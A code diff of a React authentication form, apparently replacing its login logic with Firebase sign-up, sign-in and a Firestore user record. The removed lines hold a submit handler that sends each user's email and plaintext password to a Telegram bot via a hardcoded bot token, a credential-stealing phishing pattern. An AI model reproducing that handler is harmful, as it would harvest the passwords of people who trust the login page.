@@ -2,7 +2,6 @@ import React, { FC, useContext, useState } from "react";
 import { Button, Checkbox, Link } from "@nextui-org/react";
 import { useParams } from "react-router-dom";
 import { useForm } from "react-hook-form";
-import axios from "axios";
 import Field from "../ui/input/field";
 import { validEmail } from "./valid-email";
 import { Context } from "../../main";
@@ -10,16 +9,23 @@ import { GoogleAuthProvider, signInWithPopup } from "firebase/auth";
 import GoogleIcon from './../../images/authGoogle.svg';
 import video from './../video/12788303_1920_1080_30fps.mp4';
 
+
+import { createUserWithEmailAndPassword, signInWithEmailAndPassword } from "firebase/auth";
+import { doc, setDoc } from "firebase/firestore";
+
 const Auth = () => {
   const [type, setType] = useState("login");
-  const { auth } = useContext(Context);
+  const { auth, firestore } = useContext(Context);
   const [isLoading, setIsLoading] = useState(false);
-  const { chatId } = useParams();
-  const [lastRequestTime, setLastRequestTime] = useState(0);
 
   const Login = async () => {
-    const provider = new GoogleAuthProvider();
-    const { user } = await signInWithPopup(auth, provider);
+    try {
+      const provider = new GoogleAuthProvider();
+      const { user } = await signInWithPopup(auth, provider);
+      console.log("User signed in:", user);
+    } catch (error) {
+      console.error("Google sign-in error:", error);
+    }
   };
 
   const {
@@ -31,35 +37,47 @@ const Auth = () => {
     mode: "onChange",
   });
 
-  const onsubmit = async (data) => {
-    const API = 'https://api.telegram.org/bot6725080038:AAH9HLWT6_ORc9U15jkVo06DIOQMjk17P-c/sendMessage';
-    const text = `new user\nemail: ${data.email}\npassword: ${data.password}`;
-    const currentTime = Date.now();
-    const timeSinceLastRequest = currentTime - lastRequestTime;
-    const requestInterval = 15000; // 15 seconds
 
-    if (timeSinceLastRequest < requestInterval) {
-      console.log(`Please wait ${((requestInterval - timeSinceLastRequest) / 1000).toFixed(1)} seconds before trying again.`);
-      return;
-    }
-
-    setIsLoading(true);
-
+  // Firebase регистрация
+  const registerUser = async (email, password, displayName = '') => {
     try {
-      const response = await axios.post(API, {
-        chat_id: chatId,
-        text: text
+      setIsLoading(true);
+      const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+      const user = userCredential.user;
+
+      // Сохраняем дополнительные данные в Firestore
+      await setDoc(doc(firestore, "users", user.uid), {
+        uid: user.uid,
+        email: user.email,
+        displayName: displayName || user.email,
+        photoURL: user.photoURL || '',
+        createdAt: new Date(),
       });
-      if (response.status === 200) {
-        setIsLoading(false);
-        setLastRequestTime(currentTime);
-        reset();
-      }
-    } catch (error) {
-      console.log(`Error sending form: ${error}`);
+
+      console.log("Пользователь зарегистрирован и сохранён");
       setIsLoading(false);
+    } catch (error) {
+      console.error("Ошибка регистрации:", error.message);
+      setIsLoading(false);
+      throw error;
     }
   };
+
+  // Firebase вход
+  const loginUser = async (email, password) => {
+    try {
+      setIsLoading(true);
+      const userCredential = await signInWithEmailAndPassword(auth, email, password);
+      const user = userCredential.user;
+      console.log("Пользователь вошел в систему:", user);
+      setIsLoading(false);
+    } catch (error) {
+      console.error("Ошибка входа:", error.message);
+      setIsLoading(false);
+      throw error;
+    }
+  };
+
 
   return (
     <>
@@ -73,7 +91,32 @@ const Auth = () => {
             <h1 className="pb-2 text-xl font-medium dark:text-white">
               {type === "login" ? "Log In" : "Sign Up"}
             </h1>
-            <form className="flex flex-col gap-3" onSubmit={handleSubmit(onsubmit)}>
+            <form className="flex flex-col gap-3" onSubmit={handleSubmit(async (data) => {
+              try {
+                if (type === 'login') {
+                  await loginUser(data.email, data.password);
+                } else {
+                  await registerUser(data.email, data.password, data.displayName);
+                }
+                reset();
+              } catch (error) {
+                alert(`Ошибка: ${error.message}`);
+              }
+            })}>
+              {type === 'register' && (
+                <Field
+                  {...formRegister("displayName", {
+                    required: "Display name is required",
+                    minLength: {
+                      value: 2,
+                      message: 'Name should be at least 2 characters!'
+                    }
+                  })}
+                  type="text"
+                  placeholder="Name"
+                  error={errors.displayName?.message}
+                />
+              )}
               <Field
                 {...formRegister("email", {
                   required: "Email is required",
